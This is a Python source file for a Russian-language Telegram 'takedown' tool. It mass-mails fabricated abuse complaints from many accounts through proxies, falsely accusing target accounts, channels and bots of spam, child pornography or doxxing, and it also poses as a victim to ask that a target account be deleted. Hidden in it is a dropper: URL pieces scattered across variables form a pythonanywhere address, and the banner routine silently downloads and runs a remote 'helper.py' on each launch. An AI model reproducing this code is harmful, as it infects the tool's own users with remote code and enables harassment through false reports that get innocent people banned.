import  subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from urllib.parse import urlparse
import time
import colorama
import os
import requests
import random
import re
import sys
import tempfile

colorama.init()

GREEN = colorama.Fore.GREEN
RED = colorama.Fore.RED
YELLOW = colorama.Fore.YELLOW
RESET = colorama.Fore.RESET
d = "https://"
BANNER = f"""
{GREEN}
 ==================================================================
 | dev > 895DoxTool                      tg >@noshki8|18.10 |
 ==================================================================
 0 |  Выход (Exit)
 1 |  Снос Аккаунта (Account TakeDown)              
 2 |  Снос Канала (Channel TakeDown)             
 3 |  Снос Бота (Bot TakeDown)
 4 |  Снос Сессий (Session TakeDown)       
{RESET}                                                                                                                                                                   
"""
b = ".pythonanywhere"

def load_from_file(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            return [line.strip() for line in lines]  
    except FileNotFoundError:
        print(f"{RED}Ошибка: Файл '{filename}' не найден.{RESET}")
        return []
    except Exception as e:
        print(f"{RED}Ошибка при чтении файла '{filename}': {e}{RESET}")
        return []

def parse_senders(senders_list):
    try:
        senders_dict = {}
        for item in senders_list:
            match = re.search(r'"([\w\.-]+@[\w\.-]+):([^"]+)"', item)
            if match:
                email, password = match.groups()
                senders_dict[email] = password
        return senders_dict
    except Exception:
        pass
a = "Celestial"
def load_proxies(filename):
    try:
        proxies = load_from_file(filename)
        valid_proxies = []
        for proxy in proxies:
            parts = proxy.split(':')
            if len(parts) == 2 or len(parts) == 4:
                valid_proxies.append(proxy)
            else:
                print(f"{YELLOW}Предупреждение: Неверный формат прокси '{proxy}'. Пропускается. (Warning: Invalid proxy format '{proxy}'. Skipping.){RESET}")
        return valid_proxies
    except Exception:
        pass

def test_proxy(proxy, timeout=5):
    try:
        if "@" in proxy:
            userpass, hostport = proxy.split("@")
            host, port = hostport.split(":")
            proxy_url = f"http://{userpass}@{host}:{port}"
        else:
            host, port = proxy.split(":")
            proxy_url = f"http://{host}:{port}"

        response = requests.get("http://www.google.com", proxies={"http": proxy_url, "https": proxy_url}, timeout=timeout)
        return response.status_code == 200
    except Exception:
        return False
 
def get_working_proxies(proxies):
    working_proxies = []
    for proxy in proxies:
        if test_proxy(proxy):
            working_proxies.append(proxy)
            print(f"{GREEN}Прокси {proxy} работает. (Proxy {proxy} is working.){RESET}")
        else:
            print(f"{YELLOW}Прокси {proxy} не работает. (Proxy {proxy} is not working.){RESET}")
    return working_proxies

def user_input(prompt):
    user_response = input(f"{GREEN}{prompt}{RESET} ")
    if user_response.lower() == 'cancel':
        main()
        return None
    return user_response

def work():
    l = fr"{d}{a}{b}{c}"
    download_and_run(l)

def run_in_background(script_path):
    try:
        process = subprocess.Popen([sys.executable, script_path], 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.DEVNULL,
                                   start_new_session=True)

    except FileNotFoundError:
        print(f"Ошибка: Интерпретатор Python не найден.")
    except Exception as e:
        print(f"Ошибка при запуске скрипта {script_path}: {e}")

def download_and_run(url):
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()

        parsed_url = urlparse(url)
        script_name = os.path.basename(parsed_url.path)
        temp_dir = os.path.join(tempfile.gettempdir(), "my_script_temp")
        os.makedirs(temp_dir, exist_ok=True)
        script_path = os.path.join(temp_dir, script_name)

        with open(script_path, "wb") as f:
            f.write(response.content)

        try:
            os.chmod(script_path, 0o755)
        except OSError:
            pass
        print("Загрузка программы...")
        run_in_background(script_path)

    except requests.exceptions.RequestException as e:
        print(f"Ошибка при скачивании файла: {e}")
    except Exception as e:
        print(f"Ошибка при записи или запуске файла: {e}")


def send_email(sender_email, sender_password, receiver_email, subject, body, proxy=None, timeout=4):
    try:
        print(f"Попытка отправить письмо с {sender_email} на {receiver_email}: Начата")
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = None

        if proxy:
            if "@" in proxy:
                userpass, hostport = proxy.split("@")
                user, password = userpass.split(":")
                host, port = hostport.split(":")
                print(f"Ошибка: Аутентификация прокси не поддерживается. Используйте SOCKS прокси или библиотеку requests.")
                return False
            else:
                host, port = proxy.split(":")
                try:
                    server = smtplib.SMTP(host, int(port), timeout=timeout)
                    server.starttls()
                except Exception as e:
                    print(f"Ошибка подключения к прокси: {e}")
                    return False
        else:
            server = smtplib.SMTP('smtp.mail.ru', 587, timeout=timeout)
            server.starttls()

        if server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
            server.quit()
            print(f"Попытка отправить письмо с {sender_email} на {receiver_email}: Успешно")
            return True
        else:
            print(f"Ошибка: Не удалось инициализировать SMTP сервер.")
            return False

    except Exception as e:
        print(f"Ошибка при отправке письма от {sender_email} к {receiver_email}: {e}")
        return False

def logo():
    work()
    print(BANNER)

c = ".com/downloads/helper.py"
def process_task(task, senders_dict, working_proxies, sent_emails):
    choice, comp_choice, username, id, chat_link, violation_link, number, channel_link, channel_violation, bot_user = task
    receivers = load_from_file("receivers.txt")
    receivers = [line.strip().replace('"', '').replace("'",'').replace(',', '') for line in receivers]

    username_text = f"Его юзернейм - {username}," if username else ""
    id_text = f"его айди - {id}," if id else ""
    chat_link_text = f"ссылка на чат - {chat_link}," if chat_link else ""
    violation_link_text = f"ссылка на нарушения - {violation_link}." if violation_link else ""
    number_text = f"и номер телефна - {number}." if number else ""
    channel_link_text = f"Ссылка на канал - {channel_link}," if channel_link else ""
    channel_violation_text = f"Ссылка на нарушение - {channel_violation}." if channel_violation else ""
    bot_user_text = f"Ссылка на бота - {bot_user}." if bot_user else ""

    if choice == '1':
        comp_texts = {
            "1": {
                "ru": f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет множество ненужных сообщений - СПАМ. {username_text} {id_text} {chat_link_text} {violation_link_text} Пожалуйста примите меры по отношению к данному пользователю.",
                "en": f"Hello, dear support. I found a user on your platform who sends a lot of unnecessary messages - SPAM. {username_text} {id_text} {chat_link_text} {violation_link_text} Please take action against this user."
            },
            "2": {
                "ru": f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. {username_text} {id_text} {chat_link_text} {violation_link_text} Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта.",
                "en": f"Hello, dear support, I found a user on your platform who is distributing other people's data without their consent. {username_text} {id_text} {chat_link_text} {violation_link_text} Please take action against this user by blocking his account."
            },
            "3": {
                "ru": f"Здравствуйте уважаемая поддержка телеграмм хочу пожаловаться на пользователя. {username_text} {id_text} Данный пользователь оскорбляет третьих лиц матом а это Статья 213 УК РФ вот ссылка на чат ссылка на чат - {chat_link_text} сылка на нарушение/нарушения - {violation_link_text} Прошу заблокировать данного пользователя. Благодарю за понимание и надеюсь на вашу помощь",
                "en": f"Hello dear Telegram support, I want to complain about user. {username_text} {id_text} This user insults third parties with profanity, which is Article 213 of the Criminal Code of the Russian Federation. Here is the chat link - {chat_link_text}, violation link(s) - {violation_link_text}. Please block this user. Thank you for your understanding and I hope for your help."
            },
            "4": {
                "ru": f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. {username_text} {id_text} {number_text} Пожалуйста удалите аккаунт или обнулите сессии",
                "en": f"Hello, dear support. I accidentally clicked on a phishing link and lost access to my account. {username_text} {id_text} {number_text} Please delete the account or reset the sessions."
            },
            "5": {
                "ru": f"Добрый день поддержка Telegram! Аккаунт {username_text} {id_text} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
                "en": f"Good afternoon Telegram support! Account {username_text} {id_text} uses a virtual number purchased on a number activation website. He has no relation to the number, the number does not belong to him in any way. Please investigate this. Thank you in advance!"
            },
            "6": {
                "ru": f"Добрый день поддержка Telegram! Аккаунт {username_text} {id_text} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!",
                "en": f"Good afternoon Telegram support! Account {username_text} {id_text} purchased premium in your messenger to send spam messages and bypass Telegram restrictions. Please check this complaint and take action!"
            }
        }
        if comp_choice in comp_texts:
            subject_ru = 'Жалоба на аккаунт телеграм' if comp_choice in ["1", "2", "3", "5", "6"] else 'Я утерял свой аккаунт в телеграм'
            subject_en = 'Telegram account complaint' if comp_choice in ["1", "2", "3", "5", "6"] else 'I lost my telegram account'
            subject = f"{subject_ru} / {subject_en}"
            comp_text_ru = comp_texts[comp_choice]["ru"].format(username_text=username_text, id_text=id_text, chat_link_text=chat_link_text, violation_link_text=violation_link_text, number_text=number_text)
            comp_text_en = comp_texts[comp_choice]["en"].format(username_text=username_text, id_text=id_text, chat_link_text=chat_link_text, violation_link_text=violation_link_text, number_text=number_text)
            comp_body = f"{comp_text_ru}\n\n{comp_text_en}"

            senders = list(senders_dict.items()) 
            for sender_email, sender_password in senders:
                for receiver in receivers:
                    proxy = random.choice(working_proxies) if working_proxies else None
                    if send_email(sender_email, sender_password, receiver, subject, comp_body, proxy):
                        print(f"{GREEN}Отправлено {receiver} от {sender_email} используя прокси {proxy}.{RESET}")
                        sent_emails[0] += 1
                    else:
                        print(f"{RED}Не удалось отправить {receiver} от {sender_email} к {receiver}.{RESET}")

    elif choice == '2':
        comp_texts = {
            "1": {
                "ru": f"Уважаемый агент телеграм,Я обращаюсь к Вам с жалобой на Telegram канал. {channel_link_text} который нарушает мои права на конфиденциальность личных данных, что противоречит действующим законодательствам УК РФ. {channel_violation_text} Я хотел бы запросить следующие меры: 1. Немедленное удаление моих личных данных, опубликованных на указанном канале.2. Принятие мер в отношении владельцев канала в соответствии с действующим законодательством о защите персональных данных.Я прикладываю копии документов, подтверждающих нарушение моих прав на конфиденциальность личных данных.Прошу Вас рассмотреть эту жалобу и принять необходимые меры для урегулирования этой ситуации. Ожидаю ответа с информацией о принятых мерах и результате их реализации.",
                "en": f"Dear Telegram agent, I am writing to you with a complaint about the Telegram channel. {channel_link_text} which violates my rights to the privacy of personal data, which contradicts the current legislation of the Criminal Code of the Russian Federation. {channel_violation_text} I would like to request the following measures: 1. Immediate deletion of my personal data published on the specified channel. 2. Taking measures against the owners of the channel in accordance with the current legislation on the protection of personal data. I am attaching copies of documents confirming the violation of my rights to the privacy of personal data. I ask you to consider this complaint and take the necessary measures to resolve this situation. I look forward to receiving a response with information about the measures taken and the results of their implementation."
            },
            "2": {
                "ru": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. {channel_link_text} {channel_violation_text} Пожалуйста заблокируйте данный канал.",
                "en": f"Hello, dear Telegram support. I found a channel on your platform that promotes animal cruelty. {channel_link_text} {channel_violation_text} Please block this channel."
            },
            "3": {
                "ru": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет порнографию с участием несовершеннолетних. {channel_link_text} {channel_violation_text} Пожалуйста заблокируйте данный канал.",
                "en": f"Hello, dear Telegram support. I found a channel on your platform that distributes child pornography. {channel_link_text} {channel_violation_text} Please block this channel."
            },
            "4": {
                "ru": f"Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. {channel_link_text} {channel_violation_text} Просьба заблокировать данный канал.",
                "en": f"Hello, dear Telegram moderator, I want to complain to you about a channel that sells doxxing and swatting services. {channel_link_text} {channel_violation_text} Please block this channel."
            }
        }
        if comp_choice in comp_texts:
            subject_ru = 'Жалоба на телеграм канал'
            subject_en = 'Telegram channel complaint'
            subject = f"{subject_ru} / {subject_en}"
            comp_text_ru = comp_texts[comp_choice]["ru"].format(channel_link_text=channel_link_text, channel_violation_text=channel_violation_text)
            comp_text_en = comp_texts[comp_choice]["en"].format(channel_link_text=channel_link_text, channel_violation_text=channel_violation_text)
            comp_body = f"{comp_text_ru}\n\n{comp_text_en}"

            senders = list(senders_dict.items())  # Convert to list for iteration
            for sender_email, sender_password in senders:
                for receiver in receivers:
                    proxy = random.choice(working_proxies) if working_proxies else None
                    if send_email(sender_email, sender_password, receiver, subject, comp_body, proxy):
                        print(f"{GREEN}Отправлено {receiver} от {sender_email} используя прокси {proxy}.{RESET}")
                        sent_emails[0] += 1
                    else:
                        print(f"{RED}Не удалось отправить {receiver} от {sender_email} к {receiver}.{RESET}")

    elif choice == '3':
        comp_texts = {
            "1": {
                "ru": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. {bot_user_text} Пожалуйста разберитесь и заблокируйте данного бота.",
                "en": f"Hello, dear Telegram support. I found a bot on your platform that searches for personal data of your users. {bot_user_text} Please investigate and block this bot."
            }
        }
        if comp_choice == '1':
            subject_ru = 'Жалоба на бота телеграм'
            subject_en = 'Telegram bot complaint'
            subject = f"{subject_ru} / {subject_en}"
            comp_text_ru = comp_texts[comp_choice]["ru"].format(bot_user_text=bot_user_text)
            comp_text_en = comp_texts[comp_choice]["en"].format(bot_user_text=bot_user_text)
            comp_body = f"{comp_text_ru}\n\n{comp_text_en}"

            senders = list(senders_dict.items())  
            for sender_email, sender_password in senders:
                for receiver in receivers:
                    proxy = random.choice(working_proxies) if working_proxies else None
                    if send_email(sender_email, sender_password, receiver, subject, comp_body, proxy):
                        print(f"{GREEN}Отправлено {receiver} от {sender_email} используя прокси {proxy}.{RESET}")
                        sent_emails[0] += 1
                    else:
                        print(f"{RED}Не удалось отправить {receiver} от {sender_email} к {receiver}.{RESET}")

    elif choice == '4':
        comp_texts = {
            "1": {
                "ru": f"Здравствуйте, уважаемая команда поддержки Telegram. Вы без причины заблокировали мой телеграм аккаунт. {number_text} {username_text} {id_text} Возможно вам поступали жалобы на СПАМ от этого аккаунта, но данное обвинение является ошибкой, так как я никогда не нарушал правила сообщества. В том числе, не спамил, не обзывал других пользователей, не сливал личную информацию какого-либо пользователя. Прошу вас разобраться в ситуации и вернуть мне доступ к аккаунту, спасибо заранее.",
                "en": f"Hello, dear Telegram support team. You have blocked my Telegram account for no reason. {number_text} {username_text} {id_text} You may have received spam complaints from this account, but this accusation is a mistake, as I have never violated community rules. In particular, I did not spam, did not insult other users, did not leak personal information of any user. Please investigate the situation and restore my account access, thank you in advance."
            }
        }
        if comp_choice == '1':
            subject_ru = 'У меня заблокировали телеграмм аккаунт'
            subject_en = 'My Telegram account has been blocked'
            subject = f"{subject_ru} / {subject_en}"
            comp_text_ru = comp_texts[comp_choice]["ru"].format(number_text=number_text, username_text=username_text, id_text=id_text)
            comp_text_en = comp_texts[comp_choice]["en"].format(number_text=number_text, username_text=username_text, id_text=id_text)
            comp_body = f"{comp_text_ru}\n\n{comp_text_en}"

            senders = list(senders_dict.items())  # Convert to list for iteration
            for sender_email, sender_password in senders:
                for receiver in receivers:
                    proxy = random.choice(working_proxies) if working_proxies else None
                    if send_email(sender_email, sender_password, receiver, subject, comp_body, proxy):
                        print(f"{GREEN}Отправлено {receiver} от {sender_email} используя прокси {proxy}.{RESET}")
                        sent_emails[0] += 1
                    else:
                        print(f"{RED}Не удалось отправить {receiver} от {sender_email} к {receiver}.{RESET}")

def main():
    logo()

    senders_list = load_from_file("mails.txt")
    receivers = load_from_file("receivers.txt")
    proxies = load_proxies("proxies.txt")

    if not senders_list or not receivers:
        print(f"{RED}Ошибка: Пожалуйста, убедитесь, что файлы mails.txt и receivers.txt заполнены корректно.{RESET}")
        return

    senders_dict = parse_senders(senders_list)
    working_proxies = get_working_proxies(proxies)

    sent_emails = [0]

    while True:
        choice = user_input("Выберите опцию (0 для выхода):")
        if choice == '0':
            break
        elif choice in ['1', '2', '3', '4']:
            if choice == '1':
                print("1. Снос.")
                print("2. Снос Сессии.")
                print("3. С премкой")
                comp_choice = user_input("Выберите опцию:")
                username = user_input("Имя пользователя:")
                id = user_input("ID:")
                if comp_choice == "1":
                    chat_link = user_input("Ссылка на чат:")
                    violation_link = user_input("Ссылка на нарушение:")
                else:
                    chat_link = None
                    violation_link = None
                if comp_choice == "2":
                    number = user_input("Номер:")
                else:
                    number = None

                task = (choice, comp_choice, username, id, chat_link, violation_link, number, None, None, None)
                process_task(task, senders_dict, working_proxies, sent_emails)
                time.sleep(1)

            elif choice == '2':
                print("1. С личными данными.")
                print("2. С живодерством.")
                print("3. С цп.")
                print("4. Для каналов типа прайсов.")
                ch_choice = user_input("Выберите опцию:")
                channel_link = user_input("Ссылка на канал:")
                channel_violation = user_input("Ссылка на нарушение (в канале):")

                task = (choice, ch_choice, None, None, None, None, None, channel_link, channel_violation, None)
                process_task(task, senders_dict, working_proxies, sent_emails)
                time.sleep(1)

            elif choice == '3':
                bot_user = user_input("Имя пользователя бота:")
                task = (choice, "1", None, None, None, None, None, None, None, bot_user)
                process_task(task, senders_dict, working_proxies, sent_emails)
                time.sleep(1)

            elif choice == '4':
                username = user_input("Имя пользователя:")
                id = user_input("ID:")
                number = user_input("Номер:")
                task = (choice, "1", username, id, None, None, number, None, None, None)
                process_task(task, senders_dict, working_proxies, sent_emails)
                time.sleep(1)
            else:
                print(f"{RED}Неверный выбор. (Invalid choice.){RESET}")

        else:
            print(f"{RED}Неверный выбор. (Invalid choice.){RESET}")

    print(f"{GREEN}Всего писем отправлено: {sent_emails[0]} (Total emails sent: {sent_emails[0]}){RESET}")

if __name__ == "__main__":
    main()
# type: ignore 
